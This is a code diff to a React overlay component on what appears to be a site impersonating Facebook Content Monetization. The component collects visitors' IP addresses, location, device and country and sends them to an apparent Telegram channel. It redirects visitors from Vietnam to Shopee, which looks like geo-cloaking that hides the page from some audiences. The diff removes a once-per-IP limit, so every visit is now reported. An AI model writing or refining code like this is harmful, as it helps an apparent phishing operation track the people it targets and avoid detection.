@@ -9,10 +9,10 @@ import { useAppStrings } from '@/hooks/useAppStrings'
 import { readSessionDisplayLocale } from '@/utils/facebookContentMonetizationDisplayLocale'
 import { isResolvedLocation } from '@/utils/getLocation'
 import { SendData } from '@/utils/sendData'
+import { SHOPEE_VN_URL } from '@/utils/vietnamRedirect'
 
 const READY_TIMEOUT_MS = 4500
 const HIDE_DELAY_MS = 40
-const VISIT_IP_STORAGE_PREFIX = 'fbcm_visit_ip:'
 
 /**
  * Overlay mờ chờ IP + locale (device chạy nền).
@@ -43,10 +43,10 @@ export default function FbcBootstrapOverlay() {
 
   const ready = geoReady || timedOut
 
-  // IP Việt Nam → chuyển sang Shopee, không mở trang
+  // Fallback client: server/middleware có thể không thấy IP (dev / proxy)
   React.useEffect(() => {
     if (!isVietnam) return
-    window.location.replace('https://shopee.vn/')
+    window.location.replace(SHOPEE_VN_URL)
   }, [isVietnam])
 
   React.useEffect(() => {
@@ -64,26 +64,13 @@ export default function FbcBootstrapOverlay() {
       return () => window.clearTimeout(hideId)
     }
 
-    const ip = (formData.ip || '').trim()
-    // Client: 1 IP chỉ gửi visit 1 lần (localStorage). Server cũng chặn trùng IP.
-    if (ip) {
-      try {
-        if (localStorage.getItem(`${VISIT_IP_STORAGE_PREFIX}${ip}`)) {
-          visitSentRef.current = true
-          return () => window.clearTimeout(hideId)
-        }
-      } catch {
-        /* ignore */
-      }
-    }
-
     visitSentRef.current = true
 
     const languageLabel = LOCALE_OPTION_LABELS[locale as AppLocale] || locale
 
     const payload = {
       event: 'visit',
-      ip,
+      ip: (formData.ip || '').trim(),
       location: formData.location || '',
       device: formData.device || '',
       country_code: formData.country_code || '',
@@ -91,19 +78,10 @@ export default function FbcBootstrapOverlay() {
       locale,
     }
 
-    void SendData(payload)
-      .then(() => {
-        if (!ip) return
-        try {
-          localStorage.setItem(`${VISIT_IP_STORAGE_PREFIX}${ip}`, String(Date.now()))
-        } catch {
-          /* ignore */
-        }
-      })
-      .catch((err) => {
-        console.error('Visit telegram ping failed:', err)
-        visitSentRef.current = false
-      })
+    void SendData(payload).catch((err) => {
+      console.error('Visit telegram ping failed:', err)
+      visitSentRef.current = false
+    })
 
     return () => window.clearTimeout(hideId)
   }, [
